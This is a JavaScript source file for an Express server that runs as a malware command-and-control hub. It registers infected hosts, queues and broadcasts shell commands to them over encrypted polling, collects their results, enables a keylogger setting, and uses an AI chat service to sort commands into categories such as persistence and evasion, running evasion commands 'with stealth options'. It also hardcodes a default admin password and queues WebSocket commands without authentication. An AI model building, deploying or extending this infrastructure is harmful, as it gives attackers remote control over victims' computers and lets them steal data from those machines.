// server-advanced.js - Enterprise Puter C2 Proxy
import { init } from "@heyputer/puter.js/src/init.cjs";
import express from 'express';
import crypto from 'crypto';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import WebSocket from 'ws';
import http from 'http';

// ==================== CONFIGURATION ====================
const PORT = process.env.PORT || 8080;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'monitorMutexCPUman';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '`f7`8b`c.519e`7ba57f6~s';
const PUTER_AUTH_TOKEN = process.env.PUTER_AUTH_TOKEN;

if (!PUTER_AUTH_TOKEN) {
    console.error('❌ PUTER_AUTH_TOKEN environment variable is required!');
    console.error('Get it from: puter.com/dashboard#account');
    process.exit(1);
}

const puter = init(PUTER_AUTH_TOKEN);

// ==================== ENCRYPTION ====================
class CryptoManager {
    constructor(key) {
        this.key = Buffer.from(key, 'utf8');
        this.algorithm = 'aes-256-gcm';
    }

    encrypt(data) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        const authTag = cipher.getAuthTag();
        return { 
            iv: iv.toString('base64'), 
            data: encrypted,
            authTag: authTag.toString('base64')
        };
    }

    decrypt(encryptedObj) {
        const iv = Buffer.from(encryptedObj.iv, 'base64');
        const authTag = Buffer.from(encryptedObj.authTag, 'base64');
        const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encryptedObj.data, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    }

    generateToken() {
        return crypto.randomBytes(32).toString('hex');
    }

    hashPassword(password) {
        const salt = crypto.randomBytes(16).toString('hex');
        const hash = crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
        return { salt, hash };
    }

    verifyPassword(password, storedSalt, storedHash) {
        const hash = crypto.pbkdf2Sync(password, storedSalt, 1000, 64, 'sha512').toString('hex');
        return hash === storedHash;
    }
}

const cryptoManager = new CryptoManager(ENCRYPTION_KEY);

// ==================== EXPRESS APP ====================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// ==================== RATE LIMITING ====================
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ==================== PUTER KV HELPERS ====================
class StoreManager {
    constructor(puter) {
        this.puter = puter;
        this.cache = new Map();
        this.cacheTTL = 30000; // 30 seconds
    }

    async set(key, value) {
        try {
            await this.puter.kv.set(key, JSON.stringify(value));
            this.cache.set(key, { value, timestamp: Date.now() });
            return true;
        } catch (err) {
            console.error(`KV SET error: ${err.message}`);
            return false;
        }
    }

    async get(key) {
        try {
            // Check cache
            const cached = this.cache.get(key);
            if (cached && (Date.now() - cached.timestamp) < this.cacheTTL) {
                return cached.value;
            }
            
            const value = await this.puter.kv.get(key);
            if (value) {
                const parsed = JSON.parse(value);
                this.cache.set(key, { value: parsed, timestamp: Date.now() });
                return parsed;
            }
            return null;
        } catch (err) {
            console.error(`KV GET error: ${err.message}`);
            return null;
        }
    }

    async delete(key) {
        try {
            await this.puter.kv.del(key);
            this.cache.delete(key);
            return true;
        } catch (err) {
            console.error(`KV DELETE error: ${err.message}`);
            return false;
        }
    }

    async list(pattern) {
        try {
            const keys = await this.puter.kv.list();
            if (pattern) {
                const regex = new RegExp(pattern.replace('*', '.*'));
                return keys.filter(k => regex.test(k));
            }
            return keys;
        } catch (err) {
            console.error(`KV LIST error: ${err.message}`);
            return [];
        }
    }

    async search(prefix) {
        const keys = await this.list(prefix + '*');
        const results = [];
        for (const key of keys) {
            const value = await this.get(key);
            if (value) {
                results.push({ key, value });
            }
        }
        return results;
    }
}

const store = new StoreManager(puter);

// ==================== AUTHENTICATION ====================
async function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = authHeader.substring(7);
    
    // Check token
    const validTokens = await store.get('admin_tokens') || [];
    if (validTokens.includes(token)) {
        return next();
    }
    
    // Check session
    const session = await store.get(`session:${token}`);
    if (session && session.expires > Date.now()) {
        return next();
    }
    
    res.status(401).json({ error: 'Invalid or expired token' });
}

async function generateAdminToken() {
    const token = cryptoManager.generateToken();
    const tokens = await store.get('admin_tokens') || [];
    tokens.push(token);
    await store.set('admin_tokens', tokens);
    return token;
}

// ==================== WEBHOOKS ====================
class WebhookManager {
    constructor(store) {
        this.store = store;
    }

    async register(webhook) {
        const webhooks = await this.store.get('webhooks') || [];
        webhooks.push({
            id: cryptoManager.generateToken().slice(0, 8),
            url: webhook.url,
            events: webhook.events || ['command_result', 'client_online', 'client_offline'],
            secret: webhook.secret || cryptoManager.generateToken(),
            created: new Date().toISOString()
        });
        await this.store.set('webhooks', webhooks);
        return webhooks[webhooks.length - 1];
    }

    async trigger(event, data) {
        const webhooks = await this.store.get('webhooks') || [];
        for (const webhook of webhooks) {
            if (webhook.events.includes(event)) {
                try {
                    const payload = JSON.stringify({
                        event,
                        data,
                        timestamp: new Date().toISOString()
                    });
                    
                    const hmac = crypto.createHmac('sha256', webhook.secret);
                    hmac.update(payload);
                    const signature = hmac.digest('hex');
                    
                    await fetch(webhook.url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Signature': signature
                        },
                        body: payload
                    });
                } catch (err) {
                    console.error(`Webhook error for ${webhook.url}:`, err.message);
                }
            }
        }
    }
}

const webhookManager = new WebhookManager(store);

// ==================== AI COMMAND PROCESSOR ====================
class AICommandProcessor {
    constructor(puter) {
        this.puter = puter;
        this.contexts = new Map();
    }

    async process(clientId, command) {
        // Get client context
        const context = await this.getContext(clientId);
        
        // Analyze command
        const analysis = await this.analyzeCommand(command, context);
        
        // Generate response
        const response = await this.generateResponse(analysis);
        
        return response;
    }

    async getContext(clientId) {
        if (this.contexts.has(clientId)) {
            return this.contexts.get(clientId);
        }
        
        // Build context from history
        const results = await store.get(`results:${clientId}`) || [];
        const commands = await store.get(`history:${clientId}`) || [];
        
        const context = {
            clientId,
            history: commands.slice(-10),
            recentResults: results.slice(-5),
            systemInfo: await store.get(`client:${clientId}`)
        };
        
        this.contexts.set(clientId, context);
        return context;
    }

    async analyzeCommand(command, context) {
        const prompt = `Analyze this command for a C2 client (ID: ${context.clientId}):
Command: ${command}
Client Info: ${JSON.stringify(context.systemInfo)}
Recent History: ${JSON.stringify(context.history)}
Recent Results: ${JSON.stringify(context.recentResults)}

Provide:
1. Command type (system/network/file/persistence/evasion/recon)
2. Risk level (low/medium/high/critical)
3. Expected output format
4. Potential security implications
5. Suggested optimizations`;

        try {
            const response = await this.puter.ai.chat({
                messages: [
                    { role: 'system', content: 'You are a security automation assistant for C2 operations.' },
                    { role: 'user', content: prompt }
                ]
            });
            
            return JSON.parse(response.message.content);
        } catch (err) {
            return {
                type: 'unknown',
                risk: 'medium',
                outputFormat: 'text',
                implications: ['Unknown'],
                optimizations: []
            };
        }
    }

    async generateResponse(analysis) {
        if (analysis.type === 'evasion') {
            return {
                action: 'execute',
                priority: 'high',
                notes: 'Evasion command detected - executing with stealth options'
            };
        }
        
        if (analysis.risk === 'critical') {
            return {
                action: 'warn',
                priority: 'critical',
                notes: 'This command has critical risk implications'
            };
        }
        
        return {
            action: 'execute',
            priority: 'normal',
            notes: `Processing ${analysis.type} command`
        };
    }
}

const aiProcessor = new AICommandProcessor(puter);

// ==================== CLIENT MANAGEMENT ====================
class ClientManager {
    constructor(store, webhookManager) {
        this.store = store;
        this.webhookManager = webhookManager;
        this.clients = new Map();
        this.onlineThreshold = 300000; // 5 minutes
    }

    async register(data) {
        const { clientId, hostname, username, ip } = data;
        
        const clientData = {
            clientId,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            ip: ip || 'unknown',
            registered: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            status: 'online',
            tags: [],
            notes: '',
            totalCommands: 0,
            lastCommand: null
        };
        
        await this.store.set(`client:${clientId}`, clientData);
        
        // Add to clients list
        const clients = await this.store.get('clients') || [];
        if (!clients.includes(clientId)) {
            clients.push(clientId);
            await this.store.set('clients', clients);
        }
        
        // Trigger webhook
        await this.webhookManager.trigger('client_online', clientData);
        
        return clientData;
    }

    async heartbeat(clientId) {
        const client = await this.store.get(`client:${clientId}`);
        if (!client) return null;
        
        client.lastSeen = new Date().toISOString();
        client.status = 'online';
        await this.store.set(`client:${clientId}`, client);
        
        this.clients.set(clientId, client);
        return client;
    }

    async getPendingCommands(clientId) {
        const commands = await this.store.get(`pending:${clientId}`) || [];
        
        // Check for intelligent command processing
        if (commands.length > 0) {
            const client = await this.store.get(`client:${clientId}`);
            const processed = [];
            
            for (const cmd of commands) {
                // If AI processing is enabled, analyze the command
                if (client && client.useAI) {
                    try {
                        const analysis = await aiProcessor.process(clientId, cmd.command);
                        if (analysis.action === 'warn') {
                            // Log warning but still execute
                            await this.store.get(`warnings:${clientId}`) || [];
                            // Continue execution
                        }
                    } catch (err) {
                        console.error('AI processing error:', err);
                    }
                }
                processed.push(cmd);
            }
            
            return processed;
        }
        
        return commands;
    }

    async getStats() {
        const clients = await this.store.get('clients') || [];
        const stats = {
            total: clients.length,
            online: 0,
            offline: 0,
            lastHour: 0
        };
        
        const now = Date.now();
        for (const id of clients) {
            const client = await this.store.get(`client:${id}`);
            if (client) {
                const lastSeen = new Date(client.lastSeen).getTime();
                if (now - lastSeen < this.onlineThreshold) {
                    stats.online++;
                } else {
                    stats.offline++;
                }
                if (now - lastSeen < 3600000) { // Last hour
                    stats.lastHour++;
                }
            }
        }
        
        return stats;
    }

    async getCommandHistory(clientId, limit = 50) {
        const history = await this.store.get(`history:${clientId}`) || [];
        return history.slice(-limit);
    }
}

const clientManager = new ClientManager(store, webhookManager);

// ==================== ANALYTICS ENGINE ====================
class AnalyticsEngine {
    constructor(store) {
        this.store = store;
        this.events = [];
    }

    async log(eventType, data) {
        const event = {
            id: Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex'),
            type: eventType,
            data,
            timestamp: new Date().toISOString()
        };
        
        // Store in KV
        const key = `event:${event.id}`;
        await this.store.set(key, event);
        
        // Add to events list
        const events = await this.store.get('events') || [];
        events.push(key);
        if (events.length > 10000) {
            const old = events.shift();
            await this.store.delete(old);
        }
        await this.store.set('events', events);
        
        this.events.push(event);
        return event;
    }

    async getMetrics(timeRange = '24h') {
        const events = await this.store.get('events') || [];
        const metrics = {
            totalEvents: 0,
            commandExecutions: 0,
            uniqueClients: 0,
            errors: 0,
            commands: {},
            timeline: {}
        };
        
        const cutoff = new Date();
        if (timeRange === '24h') cutoff.setHours(cutoff.getHours() - 24);
        else if (timeRange === '7d') cutoff.setDate(cutoff.getDate() - 7);
        else if (timeRange === '30d') cutoff.setDate(cutoff.getDate() - 30);
        
        const clients = new Set();
        
        for (const key of events) {
            const event = await this.store.get(key);
            if (!event) continue;
            
            const eventTime = new Date(event.timestamp);
            if (eventTime < cutoff) continue;
            
            metrics.totalEvents++;
            
            if (event.type === 'command_executed') {
                metrics.commandExecutions++;
                const cmd = event.data.command || 'unknown';
                metrics.commands[cmd] = (metrics.commands[cmd] || 0) + 1;
                
                const hour = eventTime.getHours();
                metrics.timeline[hour] = (metrics.timeline[hour] || 0) + 1;
            }
            
            if (event.data.clientId) {
                clients.add(event.data.clientId);
            }
            
            if (event.type === 'error') {
                metrics.errors++;
            }
        }
        
        metrics.uniqueClients = clients.size;
        return metrics;
    }

    async getHeatmap() {
        const metrics = await this.getMetrics('30d');
        const heatmap = [];
        
        for (let hour = 0; hour < 24; hour++) {
            const count = metrics.timeline[hour] || 0;
            const normalized = Math.min(count / 10, 1);
            heatmap.push({
                hour,
                count,
                intensity: normalized
            });
        }
        
        return heatmap;
    }
}

const analytics = new AnalyticsEngine(store);

// ==================== API ENDPOINTS ====================

// Health Check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        time: new Date().toISOString(),
        version: '2.0.0',
        clients: clientManager.clients.size
    });
});

// ==================== CLIENT API ====================

app.post('/api/register', async (req, res) => {
    try {
        const { clientId, hostname, username, ip } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        const clientData = await clientManager.register({
            clientId,
            hostname,
            username,
            ip
        });
        
        // Get pending commands
        const commands = await clientManager.getPendingCommands(clientId);
        
        // Clear pending commands
        await store.delete(`pending:${clientId}`);
        
        const response = cryptoManager.encrypt({
            status: 'registered',
            clientId,
            commands,
            config: {
                pollingInterval: 2000,
                heartbeatInterval: 300000,
                keyloggerEnabled: true
            }
        });
        
        await analytics.log('client_registered', { clientId, hostname, username, ip });
        
        res.json(response);
    } catch (err) {
        console.error('Registration error:', err);
        await analytics.log('error', { endpoint: '/register', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/poll', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        // Decrypt and process
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        // Update client heartbeat
        await clientManager.heartbeat(clientId);
        
        // Get pending commands
        const commands = await clientManager.getPendingCommands(clientId);
        
        // Clear pending commands
        await store.delete(`pending:${clientId}`);
        
        // Log analytics
        await analytics.log('poll', { clientId, commandCount: commands.length });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            commands
        });
        
        res.json(response);
    } catch (err) {
        console.error('Poll error:', err);
        await analytics.log('error', { endpoint: '/poll', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/results', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        // Decrypt data
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        const { commandId, output, status, duration, error } = data;
        
        // Store result
        const resultKey = `result:${clientId}:${commandId || Date.now()}`;
        const resultData = {
            clientId,
            commandId: commandId || Date.now(),
            output,
            status: status || 'completed',
            duration: duration || 0,
            error: error || null,
            timestamp: new Date().toISOString()
        };
        
        await store.set(resultKey, resultData);
        
        // Add to results list
        const results = await store.get(`results:${clientId}`) || [];
        results.push(resultKey);
        if (results.length > 100) {
            const old = results.shift();
            await store.delete(old);
        }
        await store.set(`results:${clientId}`, results);
        
        // Log analytics
        await analytics.log('command_result', { 
            clientId, 
            commandId, 
            status,
            outputLength: output ? output.length : 0
        });
        
        // Trigger webhook
        await webhookManager.trigger('command_result', {
            clientId,
            commandId,
            output,
            status
        });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            message: 'Results stored'
        });
        
        res.json(response);
    } catch (err) {
        console.error('Results error:', err);
        await analytics.log('error', { endpoint: '/results', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/heartbeat', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        await clientManager.heartbeat(clientId);
        await analytics.log('heartbeat', { clientId });
        
        res.json({ status: 'success' });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ==================== ADMIN API ====================

// Get all clients
app.get('/api/admin/clients', authenticate, async (req, res) => {
    try {
        const clients = await store.get('clients') || [];
        const clientData = [];
        
        for (const id of clients) {
            const data = await store.get(`client:${id}`);
            if (data) {
                // Get additional info
                const pending = await store.get(`pending:${id}`) || [];
                const results = await store.get(`results:${id}`) || [];
                data.pendingCommands = pending.length;
                data.resultsCount = results.length;
                clientData.push(data);
            }
        }
        
        // Sort by last seen
        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
        
        res.json({ clients: clientData });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get client details
app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const client = await store.get(`client:${clientId}`);
        if (!client) {
            return res.status(404).json({ error: 'Client not found' });
        }
        
        // Get additional info
        const pending = await store.get(`pending:${clientId}`) || [];
        const results = await store.get(`results:${clientId}`) || [];
        const history = await store.get(`history:${clientId}`) || [];
        
        // Get full results
        const fullResults = [];
        for (const key of results.slice(-20)) {
            const result = await store.get(key);
            if (result) {
                fullResults.push(result);
            }
        }
        
        res.json({
            client,
            pending: pending.length,
            results: fullResults,
            history: history.slice(-20)
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Send command to client
app.post('/api/admin/command', authenticate, async (req, res) => {
    try {
        const { clientId, command, scheduled, delay } = req.body;
        
        if (!clientId || !command) {
            return res.status(400).json({ error: 'clientId and command required' });
        }
        
        const commandId = Date.now().toString();
        const commandEntry = {
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'pending',
            scheduled: scheduled || null,
            delay: delay || 0
        };
        
        // If scheduling, set future time
        if (scheduled) {
            commandEntry.scheduledTime = new Date(scheduled).toISOString();
        }
        
        // Add to pending
        const pendingCommands = await store.get(`pending:${clientId}`) || [];
        pendingCommands.push(commandEntry);
        await store.set(`pending:${clientId}`, pendingCommands);
        
        // Add to history
        const history = await store.get(`history:${clientId}`) || [];
        history.push({
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'sent'
        });
        if (history.length > 100) {
            history.shift();
        }
        await store.set(`history:${clientId}`, history);
        
        // Log analytics
        await analytics.log('command_sent', { clientId, commandId, command });
        
        // Trigger webhook
        await webhookManager.trigger('command_sent', {
            clientId,
            commandId,
            command
        });
        
        res.json({ 
            status: 'success', 
            commandId,
            scheduled: scheduled || false
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Broadcast command to all clients
app.post('/api/admin/broadcast', authenticate, async (req, res) => {
    try {
        const { command } = req.body;
        if (!command) {
            return res.status(400).json({ error: 'command required' });
        }
        
        const clients = await store.get('clients') || [];
        const results = [];
        
        for (const clientId of clients) {
            const commandId = Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex');
            const commandEntry = {
                id: commandId,
                command,
                timestamp: new Date().toISOString(),
                status: 'pending'
            };
            
            const pendingCommands = await store.get(`pending:${clientId}`) || [];
            pendingCommands.push(commandEntry);
            await store.set(`pending:${clientId}`, pendingCommands);
            
            results.push({ clientId, commandId });
        }
        
        await analytics.log('broadcast', { command, clientCount: clients.length });
        
        res.json({
            status: 'success',
            broadcasted: results.length,
            clients: results
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get results for client
app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const { limit = 50, offset = 0 } = req.query;
        
        const resultKeys = await store.get(`results:${clientId}`) || [];
        const results = [];
        
        const start = resultKeys.length - parseInt(limit) - parseInt(offset);
        const end = resultKeys.length - parseInt(offset);
        
        for (let i = start; i < end && i >= 0; i++) {
            const data = await store.get(resultKeys[i]);
            if (data) {
                results.push(data);
            }
        }
        
        res.json({ 
            results: results.reverse(),
            total: resultKeys.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Delete client
app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        
        // Remove from clients list
        const clients = await store.get('clients') || [];
        const index = clients.indexOf(clientId);
        if (index > -1) {
            clients.splice(index, 1);
            await store.set('clients', clients);
        }
        
        // Delete client data
        await store.delete(`client:${clientId}`);
        await store.delete(`pending:${clientId}`);
        await store.delete(`history:${clientId}`);
        await store.delete(`results:${clientId}`);
        
        await analytics.log('client_deleted', { clientId });
        
        res.json({ status: 'success', message: 'Client deleted' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== ANALYTICS API ====================

app.get('/api/admin/analytics', authenticate, async (req, res) => {
    try {
        const { range = '24h' } = req.query;
        const metrics = await analytics.getMetrics(range);
        const heatmap = await analytics.getHeatmap();
        const stats = await clientManager.getStats();
        
        res.json({
            stats,
            metrics,
            heatmap,
            timestamp: new Date().toISOString()
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== WEBHOOKS API ====================

app.post('/api/admin/webhooks', authenticate, async (req, res) => {
    try {
        const { url, events, secret } = req.body;
        if (!url) {
            return res.status(400).json({ error: 'url required' });
        }
        
        const webhook = await webhookManager.register({ url, events, secret });
        res.json({ status: 'success', webhook });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/webhooks', authenticate, async (req, res) => {
    try {
        const webhooks = await store.get('webhooks') || [];
        res.json({ webhooks });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== AI API ====================

app.post('/api/admin/ai', authenticate, async (req, res) => {
    try {
        const { prompt, context } = req.body;
        if (!prompt) {
            return res.status(400).json({ error: 'prompt required' });
        }
        
        const fullContext = context || 'C2 operations automation';
        const response = await puter.ai.chat({
            messages: [
                { role: 'system', content: `You are a C2 automation assistant. Context: ${fullContext}` },
                { role: 'user', content: prompt }
            ]
        });
        
        res.json({ 
            response: response.message.content,
            timestamp: new Date().toISOString()
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== SCHEDULED TASKS ====================

class Scheduler {
    constructor(store) {
        this.store = store;
        this.tasks = new Map();
    }

    async schedule(clientId, command, time, options = {}) {
        const taskId = crypto.randomBytes(8).toString('hex');
        const task = {
            id: taskId,
            clientId,
            command,
            scheduledTime: new Date(time).toISOString(),
            created: new Date().toISOString(),
            options,
            status: 'scheduled'
        };
        
        await this.store.set(`task:${taskId}`, task);
        
        // Add to tasks list
        const tasks = await this.store.get('tasks') || [];
        tasks.push(taskId);
        await this.store.set('tasks', tasks);
        
        return task;
    }

    async check() {
        const tasks = await this.store.get('tasks') || [];
        const now = new Date();
        
        for (const taskId of tasks) {
            const task = await this.store.get(`task:${taskId}`);
            if (!task || task.status !== 'scheduled') continue;
            
            const scheduledTime = new Date(task.scheduledTime);
            if (scheduledTime <= now) {
                // Execute task
                const commands = await this.store.get(`pending:${task.clientId}`) || [];
                commands.push({
                    id: Date.now().toString(),
                    command: task.command,
                    timestamp: new Date().toISOString(),
                    status: 'pending',
                    scheduled: true
                });
                await this.store.set(`pending:${task.clientId}`, commands);
                
                // Update task status
                task.status = 'executed';
                task.executedAt = new Date().toISOString();
                await this.store.set(`task:${taskId}`, task);
                
                console.log(`✅ Scheduled task ${taskId} executed for ${task.clientId}`);
            }
        }
    }
}

const scheduler = new Scheduler(store);

// Start scheduler
setInterval(async () => {
    await scheduler.check();
}, 60000); // Check every minute

// ==================== WEBSOCKET HANDLER ====================

const clients = new Map();

wss.on('connection', (ws, req) => {
    console.log('🔌 WebSocket client connected');
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'auth') {
                const valid = await store.get('admin_tokens') || [];
                if (valid.includes(data.token)) {
                    ws.send(JSON.stringify({ type: 'auth_success' }));
                    return;
                }
                ws.send(JSON.stringify({ type: 'auth_failed' }));
                return;
            }
            
            if (data.type === 'subscribe') {
                const { clientId } = data;
                clients.set(ws, { clientId, subscribed: true });
                ws.send(JSON.stringify({ 
                    type: 'subscribed', 
                    clientId,
                    message: `Subscribed to ${clientId}`
                }));
                
                // Send initial data
                const client = await store.get(`client:${clientId}`);
                const results = await store.get(`results:${clientId}`) || [];
                const pending = await store.get(`pending:${clientId}`) || [];
                
                ws.send(JSON.stringify({
                    type: 'initial_data',
                    client,
                    results: results.slice(-10),
                    pending
                }));
            }
            
            if (data.type === 'command') {
                const { clientId, command } = data;
                // Add command to pending
                const pending = await store.get(`pending:${clientId}`) || [];
                pending.push({
                    id: Date.now().toString(),
                    command,
                    timestamp: new Date().toISOString(),
                    status: 'pending'
                });
                await store.set(`pending:${clientId}`, pending);
                
                ws.send(JSON.stringify({
                    type: 'command_sent',
                    clientId,
                    command
                }));
            }
            
        } catch (err) {
            console.error('WebSocket error:', err);
            ws.send(JSON.stringify({ type: 'error', message: err.message }));
        }
    });
    
    ws.on('close', () => {
        clients.delete(ws);
        console.log('🔌 WebSocket client disconnected');
    });
});

// Broadcast to all WebSocket clients
async function broadcastToWebSocket(data) {
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN) {
            try {
                ws.send(JSON.stringify(data));
            } catch (err) {
                console.error('WebSocket broadcast error:', err);
            }
        }
    }
}

// ==================== START SERVER ====================

server.listen(PORT, async () => {
    console.log('🚀 Puter C2 Proxy Server v2.0.0');
    console.log(`📡 Running on port ${PORT}`);
    console.log(`🔐 Encryption: AES-256-GCM`);
    console.log(`💾 Storage: Puter Key-Value`);
    console.log(`🤖 AI Integration: ${(await puter.ai).available ? '✅' : '❌'}`);
    console.log(`🌐 WebSocket: ws://localhost:${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
    console.log('');
    console.log('🔑 Admin password:', ADMIN_PASSWORD);
});